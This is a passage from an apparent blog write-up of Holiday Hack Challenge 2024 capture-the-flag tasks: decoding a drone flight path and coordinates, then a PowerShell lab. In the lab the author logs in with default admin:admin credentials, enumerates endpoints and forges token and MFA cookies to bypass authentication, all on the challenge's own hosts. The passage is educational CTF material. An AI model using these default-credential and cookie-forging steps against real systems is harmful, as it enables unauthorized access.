-152.8585963679403,-87.09203473086252,0 -162.5595989415154,-87.57012771908882,0 -3.726793882402935,-86.23611509627816,0 -161.9207235736839,-87.5272473521057,0 -150.2115949088656,-86.95314754908782,0 -159.3099601915958,-86.71852238363812,0 -177.0766975722902,-86.7367419242987,0 173.7151297792575,-87.18547243111809,0 13.02259087562083,-86.35966840156898,0 81.14488471250218,-87.88725244348642,0 50.62372871710384,-85.00577019678271,0 134.1005995420435,-85.62578789244232,0 137.342191367733,-85.21676094023435,0 134.9537968910206,-84.64727679011044,0 127.6095180832093,-84.28631500383617,0 58.72032095841844,-84.02924664080631,0 69.24724000830224,-82.75905747160817,0 82.27748263459516,-82.18217648194808,0 108.70378146308,-82.0756881880763,0 121.3204479152008,-82.96479276521346,0 128.0163452471495,-84.21779248389772,0 130.9249400328774,-83.83708739655414,0 129.4862643314059,-83.03807799142992,0 120.0269792779775,-80.46073786972374,0 116.028157000968,-80.04805367238716,0 74.66016612343657,-80.04881520846486,0 76.58239878266386,-79.0147782543424,0 80.59712390383287,-78.02846935544838,0 84.5712177922487,-77.72567627367928,0 92.0366753623111,-77.81036795375149,0 96.5335107064988,-78.45333936851821,0 97.98631294834743,-80.63738936076138,0 112.3800952456466,-77.96774240343886,0 114.5011540638103,-77.92822424478162,0 116.2956667667648,-77.3795734132369,0 114.7094924003757,-76.23836998004056,0 113.1311311020671,-75.13750522487116,0 109.9150311628908,-75.14941507282282,0 107.7013516817338,-76.01297373166031,0 83.81960392270727,-76.20478639958809,0 80.09399884038001,-75.42368631757148,0 81.86994293555027,-72.73059693677384,0 85.22137131545966,-71.5456478562091,0 103.4553005020279,-71.63670628943898,0 108.0046455747879,-72.62077305088222,0 110.0517139866059,-75.13908735896457,0 108.2704197255246,-72.64340876726493,0 110.8553546404679,-71.78974676100401,0 109.701610675061,-70.35468748483157,0 106.3092673916705,-69.21731265441203,0 84.05815002043883,-69.14128519421742,0 84.88285233456445,-67.31150573597776,0 88.03663677582541,-65.63565443719087,0 91.85465663878774,-65.56009670518412,0 94.80368518661909,-66.65542819322968,0 95.75917876720081,-69.5635583764721,0 106.474730023292,-69.11575939503609,0 108.4024824568454,-68.53848249213826,0 108.3684998628056,-66.63044275706439,0 107.3367418630979,-64.11134623064217,0 105.7734258806231,-64.29573721591257,0 104.2042104672492,-57.23846958726585,0 104.9516284615436,-61.14482627417831,0 86.4451260112604,-61.184398378331,0 88.92189067013281,-63.32388143429478,0
                        </coordinates>
                </LineString>
        </Placemark>
</Document>
</kml>
```

I decided to go to Google Earth and upload the KML file. After opening it Google
Earth spins to the coordinates and it looks like the flight path is showing us a
word. 

- `GUMDROP1`

I'm assuming this is a password for something. Maybe for one of the profiles on
the site. So, I try it out.

{{< image src="drone-path/drone-flight-path.png" alt="drone flight path revealing the password to the web app" position="center" style="border-radius: 8px;" >}}

I went to the login page for the site and after a little trial and error I typed
in these credentials.

- **Username:** ```fritjolf```
- **Password:** ```GUMDROP1```

Hit enter and a I got a pop up that said ```Login successful!```. Looks like
we're in! Well, to that account anyway. Decided to navigate to `Menu > Profile`
and I'm met by the following screen.

What's interesting to me is the Bio. It talks about a secret project that's
underway (making the drone armada) and it says, *"Note to self, remember drone
name, it is the same location as secret snowball warehouses
[Preparations-drone-name.csv](https://hhc24-dronepath.holidayhackchallenge.com/files/secret/Preparations-drone-name.csv)"*
Then it provides a CSV file named `Preparations-drone-name.csv`.

{{< image src="drone-path/fritjolf-profile.png" alt="fritjolf drone path profile" position="center" style="border-radius: 8px;" >}}

Something tells me this is going to help with the Elf Drone Workshop Drone
search page as seen below. The problem with this is I need the name of the 
drone to lookup in order to proceed with this.

{{< image src="drone-path/elf-drone-workshop-page.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

The `Preparations-drone-name.csv` file has a small list of coorinates in the
`OSD.longitude` and `OSD.latitude` columns of the file. The latitude and
longitude can be looked up in Google Maps see the satalite imagry for each
location.

First image from **latitude:** `-37.42277804382341` and **longitude:** 
`144.8567879816271` is an `E`. I filtered to look at it in the terrain view so 
it was easier to see. 

{{< image src="drone-path/satimage-e.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Second image from **latitude:** `-38.0569169391843` and **longitude:** 
`142.4357677725014` is an `L`.

{{< image src="drone-path/satimage-l.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Third image from **latitude:** -37.80217469906655 and **longitude:** 
143.9329094555584is an `F`.

{{< image src="drone-path/satimage-f.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Fourth image from **latitude:** -38.0682499155867 and **longitude:** 
142.2754454646221 is an `-` or hiphen.

{{< image src="drone-path/satimage-hiphen.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Fifth image from **latitude:** -34.52324587244343 and **longitude:** 
141.756352258091 is an `H`.

{{< image src="drone-path/satimage-h.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Sixth image from **latitude:** -36.74357572393437 and **longitude:** 
145.513859306511 is an `A` or hiphen.

{{< image src="drone-path/satimage-a.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Seventh image from **latitude:** -37.89721189352699 and **longitude:** 
144.745994150535 is an `W` or hiphen.

{{< image src="drone-path/satimage-w.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

Eigth and final image from **latitude:** -37.00702150480869 and **longitude:** 
145.8966329539992 is an `K` or hiphen.

{{< image src="drone-path/satimage-k.png" alt="elf drone workshop page" position="center" style="border-radius: 8px;" >}}

I have also provided a table with links to the satallite views in Google maps.
Contains the Longitude and Latitude and the letter I see.

| Longitude | Latitude | Map Link | Letter |
|:-----------|:----------|:------------------|:--------|
| 144.8567879816271 | -37.42277804382341 | [Google Map](https://maps.app.goo.gl/Y1dGKT9rekZxZyvj6) | E |
| 142.4357677725014 | -38.0569169391843 | [Google Map](https://maps.app.goo.gl/LBhGQrRGzMzBAg5E6) | L |
| 143.9329094555584 | -37.80217469906655 | [Google Map](https://maps.app.goo.gl/S8JiUx7sfQ1rSFke9) | F |
| 142.2754454646221 | -38.0682499155867 | [Google Map](https://maps.app.goo.gl/dkdqhnwJ1GhGR5eB9) | - |
| 141.756352258091  | -34.52324587244343 | [Google Map](https://maps.app.goo.gl/YnwtHEJqLiNGuimK9) | H |
| 145.513859306511  | -36.74357572393437 | [Google Map](https://maps.app.goo.gl/DxM7mTRNLSMn3QyH6) | A |
| 144.745994150535  | -37.89721189352699 | [Google Map](https://maps.app.goo.gl/dkU8NCeoV9fsraKn9) | W |
| 145.8966329539992 | -37.00702150480869 | [Google Map](https://maps.app.goo.gl/xBbQRMYcHNa8eaTx5) | K |

Looks like the answer to this is `ELF-HAWK`. After referencing all of the 

I went to the Elf Drone Workshop drone search page. I enter `ELF-HAWK` and it 
shows the following screen. With more information we'll need to parse through.
It says they've hidden the activation code in the 
[ELF-HAWK-dump.csv](https://hhc24-dronepath.holidayhackchallenge.com/files/secret/ELF-HAWK-dump.csv) file; stored in the `/files/secret` directory.

The page says they've hidden the activation code in this dataset. Stating that
it will take anyone who needs to sift through it a `LONG` time or forever to get
the activation code. Hopping that it's the `LATTER`. These seem like hints. But,
I'm unsure.

{{< image src="drone-path/eh-drone-page.png" alt="Elf drone workshop page with drone name entered" position="center" style="border-radius: 8px;" >}}

After downloading the file you come to learn that the data has been mangled a
little bit. I checked the line count for it and it looks to be `3,274` lines
long. Opening it with `csview` proves some difficulty and in `LibreOffice Calc`
it's formatted weirdly. 

Header of the CSV file was formatted weird so I fixed that. Looking through some
of the coordinates in the file. They don't lead to anywhere. Unless I need to
concatenate the broken latitude and longitudes to fix those. I'm not too sure
about that theory though.

One thing to note is as you look through the file. some of the values go past
the 180 W and 180 E values. So we might not be looking at coordinates on the
map. But, something else.

I used python to write a script that would plot the data in the `OSD.longitude`
and `OSD.latitude` columns. Initially the X axis was too narrow to show the
output so I widened it a little and I saved the figure as a PNG file so I could
put it in this write up.

I think I want to do this in `go` sometime to compare that as well.

```python
import matplotlib.pyplot as plt
import pandas as pd

def geoPlot(file):

    df = pd.read_csv(file)

    plt.figure().set_figwidth(12)
    
    plt.plot(df['OSD.longitude'], df['OSD.latitude'])

    plt.title('ELF-HAWK Dump')

    plt.savefig('ELF-HAWK-dump.png')

if __name__ == "__main":
    file = "ELF-HAWK-dump.csv"
    geoPlot(file)

```

Ran the code and it looks like it says:

- `DroneDataAnalystExpertMedal` 

Which must be the code for the `Admin Code Verfication Console`.

{{< image src="drone-path/ELF-HAWK-dump-graph.png" alt="line graph of elf-hawk dump csv file." position="center" style="border-radius: 8px;" >}}

After entering `DroneDataAnalystExpertMedal` into the Admin Code Verification
Console. The console displays a message saying, "Success: Code accepted! You 
may now steer the fleet of drones. You are officially certified as a Drone Data 
Analyst Expert!". 

{{< image src="drone-path/admin-console-success.png" alt="admin code verification console success message" position="center" style="border-radius: 8px;" >}}

Now that's complete. I'm awarded the Silver medal for the first part of the
challenge. We'll see what the gold part of the challenge looks like soon.

We also have more dialog from Chimeny Scissorsticks after completing this.

> Bravo! You've tackled the drone challenge and navigated through those KML 
> files like a true expert. Your skills are just what we need to prevent the 
> big snowball battle—the North Pole thanks you!
>
> -- **Chimeny Scissorsticks (Front Yard (Act II))**

### Solution (Gold)

> Well done! You cracked the code from the drones and showed you've mastered 
> the basics of KML files. This kind of expertise will be invaluable as we gear 
> up for what’s ahead!
>
> But I need you to dig deeper. Make sure you’re checking those file structures 
> carefully, and remember—rumor has it there is some injection flaw that might 
> just give you the upper hand. Keep your eyes sharp!
>
> -- **Chimeny Scissorsticks (Front Yard (Act II))**

## PowerShell

{{< image src="powershell/powershell-terminal.png" alt="Piney Sappington and the PowerShell terminal" position="center" style="border-radius: 8px;" >}}

> Team Wombley is developing snow weapons in preparation for conflict, but 
> they've been locked out by their own defenses. Help Piney with regaining 
> access to the weapon operations terminal.

> Hey there, friend! Piney Sappington here.
>
> You've probably heard the latest—things are getting tense around here with all 
> the faction business between Wombley and Alabaster. But, let’s focus on this 
> PowerShell Terminal for now.
>
> This is the remote access for our snowball weaponry. We programmed some defense 
> mechanisms to deter intruders, but the system is in a faulty lockdown state.
>
> I certainly wasn't the one that programmed the mechanism. Nope not me. But can 
> you help me find a way through it so I can regain access?
>
> There's two functions I need access to. The snow cannon terminal, which should 
> be easier. And the snow cannon production and deployment plans. That one's 
> better defended.
> 
> Still, I've got faith in you. We need every advantage we can get right now, 
> and you might be just the one to tip the balance.
>
> So, think you can do it? Are you ready to show what you've got?
> 
> -- **Piney Sappington (Front Yard (Act II))**

There is a link to this challenge that I've provided below. Just in case a
larger screen is needed. This can be found in the HTML when the terminal is
opened.

- [PowerShell](https://hhc24-wetty.holidayhackchallenge.com/?&challenge=termPowershell)

### Solution (Silver)

Opening the terminal welcomes us and allows to say yes or no to beginning with
the challenge. I typed `y` to get started.

{{< image src="powershell/powershell-term-init.png" alt="Initial terminal when it's opened" position="center" style="border-radius: 8px;" >}}

After typing yes. It's now time to get to finishing this challenge. First
question is below. 

1. There is a file in the current directory called 'welcome.txt'. Read the 
   contents of this file

Looks like they're getting started with something simple. We need to read the
contents of the `welcome.txt` file in the current directory or home directory.

For this I used the `Get-Content` Cmdlet. This will read the file and output the
file to the terminal.

```powershell
Get-Content -Path ./welcome.txt
```

The text file contains some information about `The Elf Weaponry Multi-Factor
Authentication (MFA)` system and it's safeguards. I am assuming that's what
we're on right now.

Looks like it provides a method for deactivating or restoring the system as
well.

```txt
System Overview
The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to 
a classified armory containing elf weapons. This high-security system is equipped 
with advanced defense mechanisms, including canaries, retinal scanner and 
keystroke analyzing, to prevent unauthorized access. In the event of suspicious 
activity, the system automatically initiates a lockdown, restricting all access 
until manual override by authorized personnel.

Lockdown Protocols
When the system enters lockdown mode, all access to the armory is frozen. This 
includes both entry to and interaction with the weaponry storage. The defense 
mechanisms become active, deploying logical barriers to prohibit unauthorized 
access. During this state, users cannot disable the system without the 
intervention of an authorized administrator. The system logs all access attempts 
and alerts central command when lockdown is triggered.

Access and System Restoration
To restore access to the system, users must follow strict procedures. First, 
authorized personnel must identify the scrambled endpoint. Next, they must 
deactivate the defense mechanisms by entering the override code and presenting 
the required token. After verification, the system will resume standard 
operation, and access to weaponry is reactivated.
```

2. Geez that sounds ominous, I'm sure we can get past the defense mechanisms. 
   We should warm up our PowerShell skills. How many words are there in the file? 

"Ain't that the truth." Looks like we're going through another warmup. This is
asking how many words there are in the `welcome.txt` file.

So, I decide to use the same command. Only pipe it to `Measure-Object` Cmdlet
with the `-Word` flag. This will count the total words within the file.

```powershell 
Get-Content -Path ./welcome.txt | Measure-Object -Word 
```

Based on the output. It looks like there is `180` words in this file. We could
hone that by wrapping the command in paranthasis with `().Words`. But, I'll
leave this one as is.

```powershell

Lines Words Characters Property
----- ----- ---------- --------
        180            
```

3. There is a server listening for incoming connections on this machine, that 
must be the weapons terminal. What port is it listening on?

So, for this one we need to see if we can find what port a server is listening
on. For this I broke out `netcat` with the `-a` flag to see what I could find.

```powershell
netstat -a 
```

Based on the output. It looks like `localhost` is listening on TCP port `1225`.

```powershell
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:1225          0.0.0.0:*               LISTEN     
tcp6       0      0 172.17.0.2:40896        52.188.247.149:443      ESTABLISHED
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     STREAM     LISTENING     1591969753 /tmp/tmux-1050/default
unix  2      [ ACC ]     STREAM     LISTENING     1591978055 /tmp/dotnet-diagnostic-523-2911700906-socket
unix  2      [ ACC ]     STREAM     LISTENING     1591978100 /tmp/CoreFxPipe_PSHost.DC4A8AC3.523.None.pwsh
unix  3      [ ]         STREAM     CONNECTED     1591971106 
unix  3      [ ]         STREAM     CONNECTED     1591972913 /tmp/tmux-1050/default
```

4. You should enumerate that webserver. Communicate with the server using HTTP, 
   what status code do you get?

Our next step is to enumperate the web server. This can be done with the
`Invoke-WebRequest` Cmdlet to `http://localhost:1225`.

```powershell
Invoke-WebRequest -Uri http://localhost:1225
```

Looks like we got a response. Although it's a `401` or `unauthorized` response
code. But, we're making progress.

```powerhshell
Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).
```

5. It looks like defensive measures are in place, it is protected by basic authentication. 
   Try authenticating with a standard admin username and password.

Looks like I am on the right track. Basic authentication is set in place to
prevent access to the web server. This question is telling us to try logging in
with a standard admin username/password.

So, I try it again with the `-AllowUnencryptedAuthentication` and the
`-Credential` flag. I store the username and password in a variable named
`$credential` using the `Get-Credentail` Cmdlet before hand so it's a little
cleaner and I'm not using `$()` variables.

```powershell
$credential = Get-Credential
Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225 -Credential $credential
```

When we go to store the username and password in `Get-Credential` it will prompt
for the username and password we want to use. We're on an interactive system.
So, I don't need to really worry about housing it in one command without the
prompt. Though I have run into that and there are ways to encode the credentials
without this prompt. But, for now. This seems to be doing the job.

At the promt, I decided to use a common default `admin:admin` for the username
and password.

```powershell
PowerShell credential request
Enter your credentials.
User: admin
Password for user admin: *****
```

After that runs. It looks like I get a `200` status code. This is coupled with a
body and other links. So, I think we're ready to move on to the next section.

```powershell                                                                                                                   
StatusCode        : 200
StatusDescription : OK
Content           : <html>
                    <body>
                    <pre>
                    ----------------------------------------------------
                    🪖 Elf MFA webserver🪖
                    ⚔️ Grab your tokens for access to weaponry ⚔️
                    ⚔️ Warning! Sensitive information on the server, protect a…
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Fri, 31 Oct 2025 04:36:55 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 3475
                    
                    <html>
                    <body>
                    <pre>
                    ---…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-T
                    ype, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://localhost:1225/endpoints/1">Endpoint 1</a>; tagName=A; href=http:
                    //localhost:1225/endpoints/1}, @{outerHTML=<a href="http://localhost:1225/endpoints/2">Endpoin
                    t 2</a>; tagName=A; href=http://localhost:1225/endpoints/2}, @{outerHTML=<a href="http://local
                    host:1225/endpoints/3">Endpoint 3</a>; tagName=A; href=http://localhost:1225/endpoints/3}, @{o
                    uterHTML=<a href="http://localhost:1225/endpoints/4">Endpoint 4</a>; tagName=A; href=http://lo
                    calhost:1225/endpoints/4}…}
RawContentLength  : 3475
RelationLink      : {}
```

6. There are too many endpoints here. Use a loop to download the contents of each 
   page. What page has 138 words? When you find it, communicate with the URL and 
   print the contents to the terminal.

Looks like I'm going to need to whip out some scripting for this. So, there are
too many endpoints in the `Links` portion of the request. So we're going to need
to something in them. We're looking for a page that has `138` words in the
`Content` property. Then we need to communicate with the URL that has `138`
words and output the `Content` property to the terminal.

So, I do just that. Save a `credential` variable because we still need to
authenticate for this. Then obtain a list of the `Links` parameter output for
each `href`. Then we need to iterate over the `$links.href` list; which will
clean the `Links` output and look at the URL solely.

For every URL there will be a request made using the credentials saved. Then I
use `Measure-Object` with the `-Word` parameter to get a count of the words.
Assigning it to the `$count` variable.

Then I check the `$count.words` to only output the `Content` for the count that
is `138` words. 

```powershell
$credential = Get-Credential
$links = (Invoke-WebRequest -Uri http://localhost:1225 -Credential $credential -AllowUnencryptedAuthentication).Links
foreach ($link in $links.href) {
    $request = Invoke-WebRequest -Uri $link -Credential $credential -AllowUnencryptedAuthentication
    $count = $request.Content | Measure-Object -Word
    if ($count.words -eq 138) {
        $request.Content
    }
}
```

Eventually it outputs the following content. This seems to have a URL to a csv
file named `token_overview.csv`.

The URL can be found below.

- http://127.0.0.1:1225/token_overview.csv

There is not much else apart from the poem/song in the body of the content.
Which doesn't seem to provide any clues.

```html
<html>
    <head>
        <title>MFA token scrambler</title>
    </head>
    <body>
        <p>Yuletide cheer fills the air,<br>    A season of love, of care.<br>    The world is bright, full of light,<br>    As we celebrate this special night.<br>    The tree is trimmed, the stockings hung,<br>    Carols are sung, bells are rung.<br>    Families gather, friends unite,<br>    In the glow of the fire’s light.<br>    The air is filled with joy and peace,<br>    As worries and cares find release.<br>    Yuletide cheer, a gift so dear,<br>    Brings warmth and love to all near.<br>    May we carry it in our hearts,<br>    As the season ends, as it starts.<br>    Yuletide cheer, a time to share,<br>    The love, the joy, the care.<br>    May it guide us through the year,<br>    In every laugh, in every tear.<br>    Yuletide cheer, a beacon bright,<br>    Guides us through the winter night </p>
        <p> Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv</p>
    </body>
</html>
```

7. There seems to be a csv file in the comments of that page.  That could be 
   valuable, read the contents of that csv-file!

In this question the objective is to download the CSV file found in the content
of the previous request.

- `token_overview.csv`

To accomplish this I used the `-OutFile` command with authentication. This will
obtain the content of the file and output it to the current directory.

```powershell
$credential = Get-Credential

Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/token_overview.csv -Credential $credential -OutFile token_overview.csv
```

With that, I need to view the file so I use the `Get-Content` Cmdlet to read the
file.

```powershell
Get-Content -Path ./token_overview.csv
```

The output shows the contents of the CSV file. This has MD5 and SHA256 pairs in
the rows. One was still active when they were sanitizing the file. So it quit.

A lot of informaiton can be taken from this file. First we know all of the MD5
hashes. But, those could be useless without the SHA256 hash. Granted... now that
I look at it. The SHA256 hash might be generated using the output of the MD5
hash. So that might come in use later if those endpoints are up by then.

We do have more data in this file too.

- **MD5 Hash:** `5f8dd236f862f4507835b0e418907ffc`
- **SHA256 Hash:** `4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C`
- **URL Format:** `http://127.0.0.1:1225/tokens/<sha256sum>`

That looks to be the gist of everything that I can see. 

```csv
file_MD5hash,Sha256(file_MD5hash)
04886164e5140175bafe599b7f1cacc8,REDACTED
664f52463ef97bcd1729d6de1028e41e,REDACTED
3e03cd0f3d335c6fb50122553f63ef78,REDACTED
f2aeb18f5b3f08420eed9b548b6058c3,REDACTED
32b9401a6d972f8c1a98de145629ea9d,REDACTED
3a79238df0a92ab0afa44a85f914fc3b,REDACTED
49c2a68b21b9982aa9fd64cf0fd79f72,REDACTED
f8142c1304efb9b7e9a7f57363c2d286,REDACTED
706457f6dd78729a8bed5bae1efaeb50,REDACTED
bb0564aa5785045937a35a9fa3fbbc73,REDACTED
4173a7bc22aee35c5fc48261b041d064,REDACTED
198b8bf2cd30a7c7fed464cca1720a88,REDACTED
3a7c8ecffeeadb164c31559f8f24a1e7,REDACTED
288e60e318d9ad7d70d743a614442ffc,REDACTED
87ab4cb29649807fdb716ac85cf560ea,REDACTED
89f3ec1275407c9526a645602d56e799,REDACTED
33539252b40b5c244b09aee8a57adbc9,REDACTED
152899789a191d9e9150a1e3a5513b7f,REDACTED
7cd48566f118a02f300cdfa75dee7863,REDACTED
d798a55fca64118cea2df3c120f67569,REDACTED
6ef5570cd43a3ec9f43c57f662201e55,REDACTED
bf189d47c3175ada98af398669e3cac3,REDACTED
743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
6fd00cbda10079b1d55283a88680d075,REDACTED
612001dd92369a7750c763963bc327f0,REDACTED
010f2cc580f74521c86215b7374eead6,REDACTED
29860c67296d808bc6506175a8cbb422,REDACTED
7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
45ffb41c4e458d08a8b08beeec2b4652,REDACTED
d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
bd7efda0cb3c6d15dd896755003c635c,REDACTED
5be8911ced448dbb6f0bd5a24cc36935,REDACTED
1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
0f262d0003bd696550744fd43cd5b520,REDACTED
8cac896f624576d825564bb30c7250eb,REDACTED
8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
38bdd7748a70529e9beb04b95c09195d,REDACTED
8d4366f08c013f5c0c587b8508b48b15,REDACTED
67566692ca644ddf9c1344415972fba8,REDACTED
8fbf4152f89b7e309e89b9f7080c7230,REDACTED
936f4db24a290032c954073b3913f444,REDACTED
c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
cb722d0b55805cd6feffc22a9f68177d,REDACTED
724d494386f8ef9141da991926b14f9b,REDACTED
67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [-] ERROR, memory corruption, not all endpoints have been REDACTED
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

Here is a command I used to filter out the pattern `REDACTED` from the output so
we could just see what we need.

```powershell
$credential = Get-Credential
Get-Content -Path ./token_overview.csv | Select-String -Pattern "REDACTED" -NotMatch
```

Ah yes. Much better.

```csv
file_MD5hash,Sha256(file_MD5hash)
5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
# [*] SYSTEMLOG
# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
# [*] Verification endpoint still active
# [*] http://127.0.0.1:1225/tokens/<sha256sum>
# [*] Contact system administrator to unlock panic mode
# [*] Site functionality at minimum to keep weapons active
```

8. Luckily the defense mechanisms were faulty! There seems to be one api-endpoint 
   that still isn't redacted! Communicate with that endpoint!

In this question they're asking us to utilize the api-endpoint that wasn't
redacted from the CSV file provided in the previous question.

```powershell
$credential = Get-Credential

$response = Invoke-WebRequest -Uri http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -AllowUnencryptedAuthentication -Credential $credential
$response
```

The request was successful to a degree. But, it looks like we're missing some
information related to the `token` cookie.

```powershell
StatusCode        : 200
StatusDescription : OK
Content           : <h1>[!] ERROR: Missing Cookie 'token'</h1>
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Fri, 31 Oct 2025 05:59:32 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 42
                    
                    <h1>[!] ERROR: Missing Co…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-T
                    ype, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {}
RawContentLength  : 42
RelationLink      : {}


```

9. It looks like it requires a cookie token, set the cookie and try again.

In this question the objective is to add the `token` cookie and attempt the
request again.
 
I will be showing two ways to do this. There is one where you utilize the
`-Headers` flag and the other is where you script out adding the cookie to a
web session.

In this one I just put the `token` cookie in the headers with the `-Headers`
flag.

```powershell
$credential = Get-Credential

$response = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"}
$response.Content
```

This one seems to have more flexability then the previous one. Not entirely sure
if there is a limit to it. But, This will build a session with a new cookie
where we can configure the name, value, and domain before adding it. Finally, I
store the response in the `$response` variable and output the `Content` for that
variable.

```powershell
$credential = Get-Credential

$session = new-object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie
$cookie.Name = "token"
$cookie.value = "5f8dd236f862f4507835b0e418907ffc"
$cookie.domain = "localhost"
$session.cookies.Add($cookie);

$response = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -WebSession $session
$response.Content
```

The HTML output needs to be provided in the terminal to move on to the next
step. Based ont he output from `$response.Content` we are seeing an MFA code
with a relative URL that we may be able to use to validate the MFA code.

```html
<h1>
    Cookie 'mfa_code', use it at <a href='1761939274.215384'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a>
</h1>
```

Here is the response without parsing out the `Content` property in the data.
This is useful for future scripting. It has a `Links` property available that we
can pull the MFA code from at the very least.

```powershell

StatusCode        : 200
StatusDescription : OK
Content           : <h1>Cookie 'mfa_code', use it at <a href='1761939274.215384'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a></h1>
RawContent        : HTTP/1.1 200 OK
                    Server: Werkzeug/3.0.6
                    Server: Python/3.10.12
                    Date: Fri, 31 Oct 2025 19:34:34 GMT
                    Connection: close
                    Content-Type: text/html; charset=utf-8
                    Content-Length: 148
                    
                    <h1>Cookie 'mfa_code', u…
Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href='1761939274.215384'>/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C</a>; tagName=A; href=1761939274.215384}}
RawContentLength  : 148
RelationLink      : {}


```

One thing I'd like to note about this challenge is the MFA code updates with
every request. So, when the code is sent. It's probably best stored in a
variable for easy scripting.

10. Sweet we got a MFA token! We might be able to get access to the system.
    Validate that token at the endpoint!

In this question the objective is to use the MFA token to gain access to the
endpoint.

I will be showing two ways to do this. There is one where you utilize the
`-Headers` flag and the other is where you script out adding the cookies to a
web session.

Typically, the output for each command is the same.

There are people on the Internet that think multiple cookies within the
`-Headers` flag isn't supported by PowerShell. This is not the case with this
version of PowerShell. You can use the first method with multiple cookies.

In this one I store the cookies in the `-Headers` flag. I obtain the data for
the MFA Code and put it in the `$mfa_code_request` variable. Clean it up down
to the `href` and put the MFA code/token in the `$mfa_code` variable. Then I
make the request to authenticate using everything needed.

This will take the credentials, token, mfa_token after pulling it from the
server and authenticate with it. All wihtin the 2 second timout for the MFA
token.

Finally, I output the content to the terminal.

```powershell
$credential = Get-Credential

$mfa_code_request = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C -Credential $credential -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"}

$mfa_code = $mfa_code_request.Links.href

$response = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C  -Credential $credential -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc; mfa_token=$mfa_code"}
$response.Content
```

In this one I use another way. I craft the initial connection to obtain the MFA
token by building the `token` cookie for the initial authentication. I obtain
the MFA token using the request with the `-WebSession`. Storing it in the
`$mfa_req` variable. I use this later to build the `mfa_token` cookie.

The `mfa_token` cookie is build after parsing through the `href` data and add it
to the session cookies.

Finally, I make the full request to the `/mfa_validate` URL with the MFA Token
and output the response content with `$response.Content`.

```powershell
$credential = Get-Credential

$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$token_cookie = New-Object System.Net.Cookie
$token_cookie.Name = "token"
$token_cookie.Value = "5f8dd236f862f4507835b0e418907ffc"
$token_cookie.Domain = "localhost"
$session.cookies.Add($token_cookie);

